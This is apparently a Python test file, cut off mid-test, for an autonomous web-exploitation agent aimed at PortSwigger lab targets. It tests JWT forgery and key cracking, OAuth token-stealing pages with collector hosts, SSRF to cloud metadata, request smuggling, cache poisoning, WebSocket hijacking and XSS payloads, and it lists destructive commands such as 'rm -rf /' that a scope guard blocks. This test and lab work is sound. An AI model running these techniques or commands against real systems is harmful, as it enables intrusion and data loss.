        # No reflection + no LLM provider -> guarded fast path returns None and
        # the agent falls back without raising.
        result = agent.execute(AgentTask(
            task_description="Reflected XSS attempt.",
            context={"target_url": target, "lab_profile": profile},
            target_vulnerability_id=vuln.id,
        ))
        self.assertFalse(result.success)


class AuthzRoutineTests(unittest.TestCase):
    def test_jwt_codec_roundtrip_and_alg_none_variants(self):
        from hacking_agent.core import authz

        payload = {"sub": "wiener", "iss": "portswigger"}
        token = authz.sign_hs({"alg": "HS256", "typ": "JWT"}, payload, "s3cr3t")
        header, decoded, sig = authz.decode_jwt(token)
        self.assertEqual(header["alg"], "HS256")
        self.assertEqual(decoded["sub"], "wiener")
        self.assertTrue(sig)
        self.assertTrue(authz.is_jwt(token))
        self.assertFalse(authz.is_jwt("not.a.jwt-really"))
        # alg:none covers every case spelling PortSwigger accepts.
        variants = authz.alg_none_variants({"sub": "administrator"})
        self.assertEqual(len(variants), 4)
        for spelling, forged in variants:
            fheader, fpayload, fsig = authz.decode_jwt(forged)
            self.assertEqual(fheader["alg"], spelling)
            self.assertEqual(fpayload["sub"], "administrator")
            self.assertEqual(fsig, "")

    def test_jwt_weak_key_crack_and_resign(self):
        from hacking_agent.core import authz

        token = authz.sign_hs({"alg": "HS256", "typ": "JWT"},
                              {"sub": "wiener"}, "secret1")
        self.assertTrue(authz.verify_hs(token, "secret1"))
        self.assertEqual(
            authz.crack_hs_secret(token, ["nope", "secret1", "x"]), "secret1")
        self.assertIsNone(authz.crack_hs_secret(token, ["nope", "x"]))
        # Resign with escalated claims under the cracked secret.
        forged = authz.tamper_payload(token, {"sub": "administrator"}, key="secret1")
        self.assertTrue(authz.verify_hs(forged, "secret1"))
        self.assertEqual(authz.decode_jwt(forged)[1]["sub"], "administrator")

    def test_jwt_algorithm_confusion_and_header_injection(self):
        from hacking_agent.core import authz

        pubkey = "-----BEGIN PUBLIC KEY-----\nMII...\n-----END PUBLIC KEY-----"
        forged = authz.algorithm_confusion_token({"sub": "administrator"}, pubkey)
        # Server that confuses RS256/HS256 verifies our HMAC with the pubkey.
        self.assertTrue(authz.verify_hs(forged, pubkey))
        self.assertEqual(authz.decode_jwt(forged)[0]["alg"], "HS256")
        jku = authz.jku_header("https://exploit/.well-known/jwks.json")
        self.assertEqual(jku["jku"], "https://exploit/.well-known/jwks.json")
        kid = authz.kid_path_traversal_header()
        self.assertIn("dev/null", kid["kid"])
        jwks = authz.build_jwks("k1", "nnn")
        self.assertEqual(jwks["keys"][0]["kid"], "k1")
        self.assertEqual(authz.jwt_technique_for("algorithm confusion"),
                         "algorithm_confusion")
        self.assertEqual(authz.jwt_technique_for("weak signing key"), "weak_key")
        self.assertEqual(authz.jwt_technique_for("unverified signature"), "alg_none")

    def test_access_control_differential_and_markers(self):
        from hacking_agent.core import authz

        finding = authz.access_control_differential(
            {"wiener": (200, 500, True), "unauth": (302, 0, False)},
            role_of=lambda n: "user" if n == "wiener" else "unauth",
        )
        self.assertIsNotNone(finding)
        self.assertEqual(finding["session"], "wiener")
        # An admin reaching an admin surface is NOT a finding.
        self.assertIsNone(authz.access_control_differential(
            {"admin": (200, 500, True)}, role_of=lambda n: "admin"))
        self.assertTrue(authz.is_admin_surface(200, "Admin panel: delete user"))
        self.assertFalse(authz.is_admin_surface(200, "just a shop"))
        self.assertTrue(authz.is_denied(403, ""))
        self.assertEqual(
            authz.extract_admin_url_from_source(
                "<script>var p='/admin-a1b2c3'</script>"), "/admin-a1b2c3")
        self.assertEqual(
            authz.find_delete_link(
                "<a href='/admin/delete?username=carlos'>x</a>"),
            "/admin/delete?username=carlos")

    def test_username_enumeration_oracles(self):
        from hacking_agent.core import authz

        self.assertEqual(
            authz.username_enum_by_response({
                "admin": "Invalid username",
                "carlos": "Invalid username",
                "administrator": "Incorrect password",
            }), "administrator")
        # No single odd-one-out -> inconclusive.
        self.assertIsNone(authz.username_enum_by_response({
            "a": "Invalid username", "b": "Incorrect password"}))
        self.assertEqual(
            authz.username_enum_by_timing(
                {"a": 0.10, "b": 0.11, "c": 0.90, "d": 0.12}), "c")
        self.assertEqual(authz.detect_login_outcome(
            200, "You have made too many incorrect login attempts"), "locked")

    def test_information_disclosure_helpers(self):
        from hacking_agent.core import authz

        self.assertTrue(authz.looks_like_git_head("ref: refs/heads/master\n"))
        self.assertFalse(authz.looks_like_git_head("not git"))
        self.assertTrue(authz.looks_like_git_index(b"DIRC\x00\x00\x00\x02"))
        variants = authz.backup_file_variants("index.php")
        self.assertIn("index.php.bak", variants)
        self.assertIn("index.php~", variants)
        self.assertTrue(authz.has_error_disclosure(
            "Traceback (most recent call last): line 5, in handler"))
        self.assertIn("/.git/HEAD", authz.GIT_PATHS)

    def test_oauth_and_business_logic_helpers(self):
        from hacking_agent.core import authz

        variants = authz.redirect_uri_variants(
            "https://legit.app/callback", "https://exploit.net")
        self.assertIn("https://exploit.net", variants)
        page = authz.steal_token_page("https://collector.net")
        self.assertIn("document.location.hash", page)
        body = authz.openid_registration_ssrf_body(
            "http://169.254.169.254/", "https://exploit.net/cb")
        self.assertEqual(body["logo_uri"], "http://169.254.169.254/")
        self.assertIn(-1, authz.quantity_tamper_values())
        self.assertIn("0", authz.price_tamper_values())
        self.assertTrue(authz.long_input_values()[0].startswith("a"))
        self.assertIn("client-side", authz.business_logic_hint("client side controls").lower())


class _AuthzFakeExecutor:
    """Scriptable tool executor for authz fast-path tests (single result)."""

    def __init__(self, responder):
        self.calls = []
        self._responder = responder

    def call(self, decision, agent_name, phase="general", iteration=0):
        self.calls.append(decision)
        return {"blocked": False, "blocked_reason": "", "signals": None,
                "result": self._responder(decision)}


class AuthzFastPathTests(unittest.TestCase):
    TARGET = "https://0abc.web-security-academy.net"

    def _agent_and_vuln(self, vuln_type, fake):
        memory = AgentMemory(target_url=self.TARGET)
        target = memory.add_entity("Target", {"url": memory.target_url})
        vuln = memory.add_entity("Vulnerability", {
            "vuln_type": vuln_type, "severity": "high",
            "target_entity_id": target.id, "status": "theoretical",
        }, entity_id="vulnerability:1")
        agent = ExploitationAgent(
            provider=None, memory=memory, state_machine=StateMachine(),
            evidence=EvidenceStore(), tool_executor=fake,
        )
        return agent, vuln, memory

    @staticmethod
    def _cookie_sub(decision):
        from hacking_agent.core import authz
        cookie = (decision.args.get("headers") or {}).get("Cookie", "")
        if "=" not in cookie:
            return None
        token = cookie.split("=", 1)[1]
        try:
            return authz.decode_jwt(token)[1].get("sub")
        except Exception:
            return None

    def test_jwt_alg_none_fast_path_deletes_carlos(self):
        from hacking_agent.core import authz

        token = authz.sign_hs({"alg": "HS256", "typ": "JWT"},
                              {"sub": "wiener", "iss": "ps"}, "unknown-key")

        def responder(decision):
            url = decision.args.get("url", "")
            is_admin = self._cookie_sub(decision) == "administrator"
            if url.endswith("/admin") and is_admin:
                return ("HTTP/1.1 200 OK\r\n\r\n<h1>Admin panel</h1>"
                        "<a href='/admin/delete?username=carlos'>Delete</a>")
            if url.endswith("/admin"):
                return "HTTP/1.1 401 Unauthorized\r\n\r\nAdmin interface only"
            if "/admin/delete" in url:
                return "HTTP/1.1 302 Found\r\n\r\n"
            if url.rstrip("/") == self.TARGET:
                return "HTTP/1.1 200 OK\r\n\r\n<p>Congratulations, you solved the lab</p>"
            return "HTTP/1.1 404 Not Found\r\n\r\nnope"

        fake = _AuthzFakeExecutor(responder)
        agent, vuln, memory = self._agent_and_vuln("JWT auth bypass", fake)
        profile = {"playbook_id": "jwt",
                   "subvariant": "jwt authentication bypass via unverified signature",
                   "jwt": token, "jwt_cookie": "session"}
        result = agent.execute(AgentTask(
            task_description="JWT unverified signature bypass; delete carlos.",
            context={"target_url": self.TARGET, "lab_profile": profile},
            target_vulnerability_id=vuln.id,
        ))
        self.assertTrue(result.success)
        self.assertTrue(agent.evidence.is_verified(vuln.id))
        self.assertTrue(memory.get_fact("lab_solved"))
        self.assertEqual(vuln.attrs["admin_path"], "/admin")

    def test_jwt_weak_key_fast_path_cracks_and_resigns(self):
        from hacking_agent.core import authz

        token = authz.sign_hs({"alg": "HS256", "typ": "JWT"},
                              {"sub": "wiener"}, "secret1")

        def responder(decision):
            if decision.tool == "jwt_tool":
                return json.dumps({"output": "unable to determine", "mode": "crack"})
            url = decision.args.get("url", "")
            is_admin = self._cookie_sub(decision) == "administrator"
            if url.endswith("/admin") and is_admin:
                return ("HTTP/1.1 200 OK\r\n\r\nAdmin panel "
                        "<a href='/admin/delete?username=carlos'>x</a>")
            if url.endswith("/admin"):
                return "HTTP/1.1 401 Unauthorized\r\n\r\ndenied"
            if "/admin/delete" in url:
                return "HTTP/1.1 302 Found\r\n\r\n"
            if url.rstrip("/") == self.TARGET:
                return "HTTP/1.1 200 OK\r\n\r\nCongratulations, you solved the lab"
            return "HTTP/1.1 404 Not Found\r\n\r\nnope"

        fake = _AuthzFakeExecutor(responder)
        agent, vuln, _ = self._agent_and_vuln("JWT weak key", fake)
        profile = {"playbook_id": "jwt",
                   "subvariant": "jwt authentication bypass via weak signing key",
                   "jwt": token, "jwt_cookie": "session"}
        result = agent.execute(AgentTask(
            task_description="Crack the weak JWT key and forge an admin token.",
            context={"target_url": self.TARGET, "lab_profile": profile},
            target_vulnerability_id=vuln.id,
        ))
        self.assertTrue(result.success)
        self.assertEqual(vuln.attrs["jwt_technique"], "weak_key:secret1")

    def test_unprotected_admin_fast_path_via_robots(self):
        def responder(decision):
            url = decision.args.get("url", "")
            if url.endswith("/robots.txt"):
                return ("HTTP/1.1 200 OK\r\n\r\nUser-agent: *\r\n"
                        "Disallow: /administrator-panel")
            if url.endswith("/administrator-panel"):
                return ("HTTP/1.1 200 OK\r\n\r\n<h1>Admin panel</h1>"
                        "<a href='/admin/delete?username=carlos'>Delete carlos</a>")
            if "/admin/delete" in url:
                return "HTTP/1.1 302 Found\r\n\r\n"
            if url.rstrip("/") == self.TARGET:
                return "HTTP/1.1 200 OK\r\n\r\nCongratulations, you solved the lab"
            return "HTTP/1.1 404 Not Found\r\n\r\nnope"

        fake = _AuthzFakeExecutor(responder)
        agent, vuln, memory = self._agent_and_vuln("Broken access control", fake)
        profile = {"playbook_id": "access_control_idor",
                   "subvariant": "unprotected admin functionality"}
        result = agent.execute(AgentTask(
            task_description="Find the unprotected admin panel and delete carlos.",
            context={"target_url": self.TARGET, "lab_profile": profile},
            target_vulnerability_id=vuln.id,
        ))
        self.assertTrue(result.success)
        self.assertEqual(vuln.attrs["ac_subvariant"], "unprotected_admin")
        self.assertTrue(memory.get_fact("lab_solved"))

    def test_username_enumeration_fast_path(self):
        from urllib.parse import parse_qs

        def responder(decision):
            url = decision.args.get("url", "")
            if url.endswith("/login") and decision.args.get("method") == "POST":
                data = parse_qs(decision.args.get("data", ""))
                user = (data.get("username") or [""])[0]
                pw = (data.get("password") or [""])[0]
                if user == "administrator" and pw == "letmein":
                    return ("HTTP/1.1 302 Found\r\nSet-Cookie: session=abc123\r\n"
                            "Location: /my-account\r\n\r\n")
                if user == "administrator":
                    return "HTTP/1.1 200 OK\r\n\r\nIncorrect password"
                return "HTTP/1.1 200 OK\r\n\r\nInvalid username"
            if url.endswith("/login"):
                return "HTTP/1.1 200 OK\r\n\r\n<form></form>"
            if url.endswith("/my-account"):
                return "HTTP/1.1 200 OK\r\n\r\nCongratulations, you solved the lab"
            if url.rstrip("/") == self.TARGET:
                return "HTTP/1.1 200 OK\r\n\r\nCongratulations, you solved the lab"
            return "HTTP/1.1 404 Not Found\r\n\r\nnope"

        fake = _AuthzFakeExecutor(responder)
        agent, vuln, _ = self._agent_and_vuln("Username enumeration", fake)
        profile = {"playbook_id": "authentication",
                   "subvariant": "username enumeration via different responses"}
        result = agent.execute(AgentTask(
            task_description="Enumerate the valid username, then brute the password.",
            context={"target_url": self.TARGET, "lab_profile": profile},
            target_vulnerability_id=vuln.id,
        ))
        self.assertTrue(result.success)
        self.assertEqual(vuln.attrs["enum_username"], "administrator")

    def test_information_disclosure_git_fast_path(self):
        def responder(decision):
            url = decision.args.get("url", "")
            if url.endswith("/.git/HEAD"):
                return "HTTP/1.1 200 OK\r\n\r\nref: refs/heads/master\n"
            if url.endswith("/.git/config"):
                return ("HTTP/1.1 200 OK\r\n\r\n[core]\n\trepositoryformatversion = 0")
            return "HTTP/1.1 404 Not Found\r\n\r\nnope"

        fake = _AuthzFakeExecutor(responder)
        agent, vuln, _ = self._agent_and_vuln("Information disclosure", fake)
        profile = {"playbook_id": "information_disclosure",
                   "subvariant": "version control history"}
        result = agent.execute(AgentTask(
            task_description="Find the exposed .git directory.",
            context={"target_url": self.TARGET, "lab_profile": profile},
            target_vulnerability_id=vuln.id,
        ))
        self.assertTrue(result.success)
        self.assertEqual(vuln.attrs["disclosure_kind"], "version_control")

    def test_business_logic_guided_helper_seeds_hint(self):
        fake = _AuthzFakeExecutor(lambda d: "HTTP/1.1 404 Not Found\r\n\r\nno")
        agent, vuln, memory = self._agent_and_vuln("Business logic", fake)
        profile = {"playbook_id": "business_logic",
                   "subvariant": "excessive trust in client-side controls"}
        task = AgentTask(
            task_description="Tamper the price via client-side controls.",
            context={"target_url": self.TARGET, "lab_profile": profile},
            target_vulnerability_id=vuln.id,
        )
        # Guided path: returns None (no deterministic solve) but seeds a hint.
        self.assertIsNone(agent._fast_business_logic(task, vuln, profile))
        lessons = " ".join(f["lesson"] for f in memory.get_recent_failures())
        self.assertIn("client-side", lessons.lower())

    def test_oauth_guided_helper_seeds_redirect_hint(self):
        fake = _AuthzFakeExecutor(lambda d: "HTTP/1.1 404 Not Found\r\n\r\nno")
        agent, vuln, memory = self._agent_and_vuln("OAuth", fake)
        profile = {"playbook_id": "oauth",
                   "subvariant": "account hijack via redirect_uri"}
        task = AgentTask(
            task_description="Hijack the account via redirect_uri.",
            context={"target_url": self.TARGET, "lab_profile": profile,
                     "exploit_server_url": "https://exploit-x.net"},
            target_vulnerability_id=vuln.id,
        )
        self.assertIsNone(agent._fast_oauth(task, vuln, profile))
        lessons = " ".join(f["lesson"] for f in memory.get_recent_failures())
        self.assertIn("redirect_uri", lessons)


class ToolParityTests(unittest.TestCase):
    def test_tool_registry_parity_is_62(self):
        self.assertEqual(len(TOOL_FUNCTIONS), 62)
        self.assertEqual(len(TOOL_SCHEMAS), 62)


class ToolDecisionLiteralTests(unittest.TestCase):
    """The guided-LLM exploitation path can only select tools present in the
    ToolDecision.tool Literal. It must include the Phase-2 tools and stay in
    lockstep with the actual TOOL_FUNCTIONS registry."""

    def _literal_names(self):
        from typing import get_args
        from hacking_agent.core.schemas import ToolName
        return set(get_args(ToolName))

    def test_literal_includes_phase2_tools(self):
        names = self._literal_names()
        for tool in (
            "race_send", "jwt_tool", "ssti_probe", "ysoserial_gen",
            "phpggc_gen", "dns_recon", "tls_info", "shodan_host_lookup",
            "shodan_search", "censys_host",
        ):
            self.assertIn(tool, names, f"{tool} missing from ToolDecision Literal")

    def test_every_literal_name_is_a_registered_tool(self):
        names = self._literal_names()
        for tool in names:
            self.assertIn(tool, TOOL_FUNCTIONS,
                          f"Literal tool {tool} is not a registered TOOL_FUNCTION")

    def test_literal_matches_registry_exactly_and_validates(self):
        names = self._literal_names()
        self.assertEqual(names, set(TOOL_FUNCTIONS))
        self.assertEqual(len(names), 62)
        # A ToolDecision selecting a Phase-2 tool must now validate.
        decision = ToolDecision(
            tool="race_send",
            args={"url": "https://lab.example.com/", "mode": "single_packet"},
            reasoning="Fire a last-byte-synchronized batch for a desync probe.",
            expected_signal="Distinct status distribution vs. baseline.",
        )
        self.assertEqual(decision.tool, "race_send")


class SmugglingBuilderTests(unittest.TestCase):
    """Byte-exact framing for the request-smuggling / cache / host / WS
    builders in core.smuggling."""

    def setUp(self):
        from hacking_agent.core import smuggling
        self.s = smuggling

    def test_chunk_and_terminator_framing(self):
        self.assertEqual(self.s.chunk("abc"), "3\r\nabc\r\n")
        self.assertEqual(self.s.chunked_terminator(), "0\r\n\r\n")
        self.assertEqual(self.s.chunked_body(""), "0\r\n\r\n")
        self.assertEqual(self.s.chunked_body("hi"), "2\r\nhi\r\n0\r\n\r\n")

    def test_clte_content_length_covers_whole_body(self):
        smuggled = self.s.build_smuggled_prefix("h.net", "/404")
        req = self.s.build_clte_request("h.net", smuggled)
        head, _, body = req.partition("\r\n\r\n")
        cl = int(re.search(r"Content-Length: (\d+)", head).group(1))
        self.assertEqual(cl, len(body))
        # CL.TE body must start with the zero-chunk then the smuggled request.
        self.assertTrue(body.startswith("0\r\n\r\nGET /404 HTTP/1.1"))
        self.assertIn("Transfer-Encoding: chunked", head)
        self.assertIn("X-Ignore: X", body)

    def test_tecl_content_length_is_chunk_size_line(self):
        smuggled = "GET /admin HTTP/1.1\r\nHost: h.net\r\nContent-Length: 10\r\n\r\nx=1"
        req = self.s.build_tecl_request("h.net", smuggled)
        head, _, body = req.partition("\r\n\r\n")
        cl = int(re.search(r"Content-Length: (\d+)", head).group(1))
        size_line = body.split("\r\n", 1)[0]
        # Content-Length equals the hex-size line length + CRLF.
        self.assertEqual(cl, len(size_line) + 2)
        self.assertEqual(int(size_line, 16), len(smuggled))
        self.assertTrue(body.endswith("0\r\n\r\n"))

    def test_cl0_body_is_full_smuggled_request(self):
        smuggled = "GET /admin HTTP/1.1\r\nHost: h.net\r\n\r\n"
        req = self.s.build_cl0_request("h.net", smuggled, path="/resource")
        head, _, body = req.partition("\r\n\r\n")
        cl = int(re.search(r"Content-Length: (\d+)", head).group(1))
        self.assertEqual(cl, len(smuggled))
        self.assertEqual(body, smuggled)
        self.assertTrue(head.startswith("POST /resource HTTP/1.1"))

    def test_obfuscated_te_variants_present(self):
        labels = {label for label, _ in self.s.obfuscated_te_variants()}
        for expected in ("space_before_colon", "tab_after_colon",
                         "value_prefix", "cow"):
            self.assertIn(expected, labels)

    def test_host_header_and_raw_builders(self):
        labels = {label for label, _ in self.s.host_header_variants("evil.net")}
        self.assertIn("x-forwarded-host", labels)
        dup = self.s.duplicate_host_request("a.com", "evil.net")
        self.assertEqual(dup.count("Host:"), 2)
        absuri = self.s.absolute_uri_request("a.com", "evil.net", path="/x")
        self.assertTrue(absuri.startswith("GET https://evil.net/x HTTP/1.1"))

    def test_websocket_builders(self):
        hs = self.s.ws_handshake_request("h.net", "/chat", origin="https://evil.net")
        self.assertIn("Upgrade: websocket", hs)
        self.assertIn("Origin: https://evil.net", hs)
        head, body = self.s.cswsh_page("wss://h.net/chat", "http://oob.net")
        self.assertIn("new WebSocket('wss://h.net/chat')", body)
        self.assertIn("oob.net", body)
        script = self.s.ws_client_script("ws://h.net/chat", ["READY"],
                                         origin="https://evil.net")
        self.assertIn("websocket", script)
        self.assertIn("create_connection", script)


class CachePoisoningLogicTests(unittest.TestCase):
    def setUp(self):
        from hacking_agent.core import smuggling
        self.s = smuggling

    def test_cache_buster_format(self):
        self.assertEqual(self.s.cache_buster("ZZ"), "cb=ZZ")
        self.assertTrue(self.s.cache_buster(param="x").startswith("x="))

    def test_cache_hit_and_status_detection(self):
        self.assertTrue(self.s.is_cache_hit(
            "HTTP/1.1 200 OK\r\nX-Cache: hit\r\n\r\nbody"))
        self.assertTrue(self.s.is_cache_hit(
            "HTTP/1.1 200 OK\r\nAge: 42\r\n\r\nbody"))
        self.assertFalse(self.s.is_cache_hit(
            "HTTP/1.1 200 OK\r\nX-Cache: miss\r\nAge: 0\r\n\r\nbody"))
        self.assertIn("age", (self.s.cache_status(
            "HTTP/1.1 200 OK\r\nAge: 5\r\n\r\nb") or "").lower())

    def test_reflection_and_unkeyed_variants(self):
        self.assertTrue(self.s.reflected("evil.net", "<a href=//evil.net/>"))
        self.assertFalse(self.s.reflected("evil.net", "<a href=//good.net/>"))
        header_labels = {l for l, _ in self.s.unkeyed_header_variants("p.net")}
        self.assertIn("x-forwarded-host", header_labels)
        param_labels = {l for l, _ in self.s.param_cloaking_variants("p", "v")}
        self.assertIn("dup_param", param_labels)


class WebCachePoisoningFastPathTests(unittest.TestCase):
    def test_unkeyed_header_poison_confirmed_without_llm(self):
        poison_host = ExploitationAgent._POISON_HOST

        class FakeCacheExec:
            def __init__(self):
                self.calls = []
                self.last_marker = ""

            def call(self, decision, agent_name, phase="general", iteration=0):
                self.calls.append(decision)
                headers = (decision.args or {}).get("headers") or {}
                for value in headers.values():
                    if poison_host in str(value):
                        self.last_marker = str(value)
                # Simulate a cache that reflects + persists the injected host.
                body = f"<html><a href='//{self.last_marker}/'>x</a></html>"
                resp = (
                    "HTTP/1.1 200 OK\r\nX-Cache: hit\r\n"
                    "Content-Type: text/html\r\n\r\n" + body
                )
                return {"blocked": False, "blocked_reason": "",
                        "signals": None, "result": json.dumps({"response": resp})}

        memory = AgentMemory(target_url="https://lab.example.com/")
        target = memory.add_entity("Target", {"url": memory.target_url})
        vuln = memory.add_entity("Vulnerability", {
            "vuln_type": "web cache poisoning",
            "severity": "high",
            "target_entity_id": target.id,
            "hypothesis": "Unkeyed X-Forwarded-Host cache poisoning.",
            "status": "theoretical",
        }, entity_id="vulnerability:1")
        agent = ExploitationAgent(
            provider=None, memory=memory, state_machine=StateMachine(),
            evidence=EvidenceStore(), tool_executor=FakeCacheExec(),
        )
        profile = {"playbook_id": "web_cache_poisoning",
                   "subvariant": "unkeyed header"}
        result = agent._fast_web_cache_poisoning(
            AgentTask(
                task_description="Poison the cache via an unkeyed header.",
                context={"target_url": memory.target_url, "lab_profile": profile},
                target_vulnerability_id=vuln.id,
            ),
            vuln, profile,
        )
        self.assertIsNotNone(result)
        self.assertTrue(result.success)
        self.assertEqual(vuln.attrs["status"], "verified")
        self.assertTrue(vuln.attrs.get("fast_path_validated"))


class EngagementLoadTests(unittest.TestCase):
    def test_engagement_from_dict_parses_scope_and_roe(self):
        eng = engagement_from_dict({
            "engagement_name": "Acme",
            "client": "Acme Corp",
            "tester": "Reynard",
            "authorized_domains": ["example.com", "staging.example.net"],
            "authorized_cidrs": ["10.0.0.0/24"],
            "out_of_scope": ["payments.example.com"],
            "max_requests_per_second": 5,
            "max_total_requests": 1000,
            "allow_destructive": False,
            "testing_window": {"start": "2026-01-01", "end": "2026-12-31"},
        })
        self.assertEqual(eng.engagement_name, "Acme")
        self.assertIn("example.com", eng.authorized_domains)
        self.assertEqual(eng.out_of_scope, ["payments.example.com"])
        self.assertEqual(eng.max_requests_per_second, 5.0)
        self.assertEqual(eng.max_total_requests, 1000)
        self.assertFalse(eng.allow_destructive)
        self.assertTrue(eng.has_authorized_scope())

    def test_engagement_aliases_and_string_lists(self):
        eng = engagement_from_dict({
            "name": "Alias",
            "domains": "a.com, b.com",
            "deny": ["x.a.com"],
            "rate_limit_rps": 2,
        })
        self.assertEqual(eng.engagement_name, "Alias")
        self.assertEqual(eng.authorized_domains, ["a.com", "b.com"])
        self.assertEqual(eng.out_of_scope, ["x.a.com"])
        self.assertEqual(eng.max_requests_per_second, 2.0)

    def test_empty_scope_is_not_authorized(self):
        self.assertFalse(Engagement().has_authorized_scope())

    def test_testing_window_bounds(self):
        from datetime import datetime
        eng = Engagement(
            authorized_domains=["a.com"],
            testing_window_start="2026-01-01T00:00:00",
            testing_window_end="2026-12-31T23:59:59",
        )
        self.assertTrue(eng.is_within_window(datetime(2026, 6, 1)))
        self.assertFalse(eng.is_within_window(datetime(2025, 6, 1)))
        self.assertFalse(eng.is_within_window(datetime(2027, 6, 1)))
        # no window => always within
        self.assertTrue(Engagement(authorized_domains=["a.com"]).is_within_window())

    def test_load_engagement_sample_yaml(self):
        from hacking_agent.core.paths import PROJECT_ROOT
        path = PROJECT_ROOT / "eval" / "engagement.sample.yaml"
        eng = load_engagement(str(path))
        self.assertTrue(eng.has_authorized_scope())
        self.assertIn("example.com", eng.authorized_domains)
        self.assertIn("payments.example.com", eng.out_of_scope)
        self.assertFalse(eng.allow_destructive)


class EngagementScopeGuardTests(unittest.TestCase):
    def _engagement(self, **overrides):
        base = dict(
            engagement_name="E1",
            authorized_domains=["example.com"],
            authorized_cidrs=["10.0.0.0/24"],
            out_of_scope=["payments.example.com"],
            allow_destructive=False,
        )
        base.update(overrides)
        return Engagement(**base)

    def test_default_lab_guard_unchanged_no_destructive_block(self):
        # Without an engagement attached, destructive shell + rate limits are
        # inert, preserving lab behaviour.
        guard = ScopeGuard.from_target_url("https://lab.example.com")
        guard.validate("run_shell", {"command": "rm -rf /tmp/loot"})
        self.assertFalse(guard.block_destructive)
        self.assertEqual(guard.max_total_requests, 0)

    def test_in_scope_allowed_out_of_scope_denied(self):
        guard = ScopeGuard.from_engagement(self._engagement())
        guard.validate("http_request", {"url": "https://app.example.com/x"})
        with self.assertRaises(ScopeViolation):
            guard.validate("http_request", {"url": "https://payments.example.com/"})

    def test_out_of_scope_overrides_authorized_domain(self):
        # payments.example.com is a subdomain of the authorized example.com but
        # is on the denylist, so it must still be blocked.
        guard = ScopeGuard.from_engagement(self._engagement())
        self.assertFalse(guard.is_in_scope("https://payments.example.com/"))
        self.assertTrue(guard.is_in_scope("https://api.example.com/"))

    def test_unauthorized_domain_denied(self):
        guard = ScopeGuard.from_engagement(self._engagement())
        with self.assertRaises(ScopeViolation):
            guard.validate("http_request", {"url": "https://evil.net/"})

    def test_max_total_requests_hard_cap(self):
        guard = ScopeGuard.from_engagement(
            self._engagement(max_total_requests=2)
        )
        guard.validate("http_request", {"url": "https://example.com/1"})
        guard.validate("http_request", {"url": "https://example.com/2"})
        with self.assertRaises(RateLimitExceeded):
            guard.validate("http_request", {"url": "https://example.com/3"})
        self.assertEqual(guard.requests_made(), 2)

    def test_scope_probe_does_not_consume_request_budget(self):
        guard = ScopeGuard.from_engagement(
            self._engagement(max_total_requests=2)
        )
        for _ in range(10):
            guard.is_in_scope("https://example.com/probe")
        self.assertEqual(guard.requests_made(), 0)

    def test_rate_limit_min_interval_sleeps(self):
        guard = ScopeGuard.from_engagement(
            self._engagement(max_requests_per_second=10)
        )
        clock = [0.0]
        slept: list[float] = []
        guard._now = lambda: clock[0]
        guard._sleep = lambda s: (slept.append(s), clock.__setitem__(0, clock[0] + s))
        for i in range(4):
            guard.validate("http_request", {"url": f"https://example.com/{i}"})
        self.assertEqual(len(slept), 3)
        for wait in slept:
            self.assertAlmostEqual(wait, 0.1, places=6)

    def test_destructive_block_toggle(self):
        blocked = ScopeGuard.from_engagement(
            self._engagement(allow_destructive=False)
        )
        for cmd in ("rm -rf /", "DROP TABLE users", "shutdown -h now"):
            with self.assertRaises(ScopeViolation):
                blocked.validate("run_shell", {"command": cmd})
        # SQL destructive in an http body is also caught.
        with self.assertRaises(ScopeViolation):
            blocked.validate("http_request", {
                "url": "https://example.com/q",
                "data": "q=1; DROP TABLE accounts",
            })
        # Toggle on: destructive allowed.
        allowed = ScopeGuard.from_engagement(
            self._engagement(allow_destructive=True)
        )
        allowed.validate("run_shell", {"command": "rm -rf /var/www/old"})

    def test_delete_carlos_lab_pattern_allowed_even_when_blocking(self):
        # The classic "delete carlos" lab win condition must not be treated as
        # a destructive action against a real client asset.
        guard = ScopeGuard.from_engagement(
            self._engagement(allow_destructive=False)
        )
        guard.validate("http_request", {
            "url": "https://example.com/admin/delete",
            "data": "username=carlos",
        })


class CvssHelperTests(unittest.TestCase):
    def test_known_vectors(self):
        from hacking_agent.agents.reporter import cvss_v31_base_score
        cases = {
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H": 9.8,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N": 6.1,
            "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N": 5.9,
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N": 7.5,
            "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:N": 0.0,
        }
        for vector, expected in cases.items():
            self.assertEqual(cvss_v31_base_score(vector), expected, vector)

    def test_invalid_vector_scores_zero(self):
        from hacking_agent.agents.reporter import cvss_v31_base_score
        self.assertEqual(cvss_v31_base_score("N/A"), 0.0)
        self.assertEqual(cvss_v31_base_score("garbage"), 0.0)

    def test_severity_from_score_and_severity_vectors(self):
        from hacking_agent.agents.reporter import (
            cvss_for_severity,
            severity_from_score,
        )
        self.assertEqual(severity_from_score(0.0), "info")
        self.assertEqual(severity_from_score(3.9), "low")
        self.assertEqual(severity_from_score(5.0), "medium")
        self.assertEqual(severity_from_score(7.5), "high")
        self.assertEqual(severity_from_score(9.9), "critical")
        vector, score = cvss_for_severity("critical")
        self.assertEqual(score, 9.8)
        self.assertEqual(severity_from_score(score), "critical")

    def test_cwe_mapping(self):
        from hacking_agent.agents.reporter import cwe_for
        self.assertEqual(cwe_for("Reflected XSS via search"), "CWE-79")
        self.assertEqual(cwe_for("SQL injection in login"), "CWE-89")
        self.assertEqual(cwe_for("SSRF"), "CWE-918")
        self.assertEqual(cwe_for("Insecure deserialization"), "CWE-502")
        self.assertEqual(cwe_for("something novel"), "CWE-Other")


class AssessmentReportTests(unittest.TestCase):
    def _memory_with_finding(self, verified=True):
        mem = AgentMemory(target_url="https://example.com")
        ev = EvidenceStore()
        vuln = mem.add_entity("Vulnerability", {
            "vuln_type": "Reflected XSS",
            "severity": "high",
            "parameter": "search",
            "endpoint": "https://example.com/search",
            "hypothesis": "search reflects unencoded input into HTML",
        })
        if verified:
            ev.record(PoC(
                vuln_id=vuln.id,
                payload="<script>alert(1)</script>",
                request_summary="GET /search?q=<script>alert(1)</script>",
                response_excerpt="<h1><script>alert(1)</script></h1>",
                verdict="success",
                agent_name="exploitation",
            ))
        return mem, ev

    def test_extract_findings_scores_and_gates(self):
        from hacking_agent.agents.reporter import extract_findings
        mem, ev = self._memory_with_finding(verified=True)
        findings = extract_findings(mem, ev)
        self.assertEqual(len(findings), 1)
        f = findings[0]
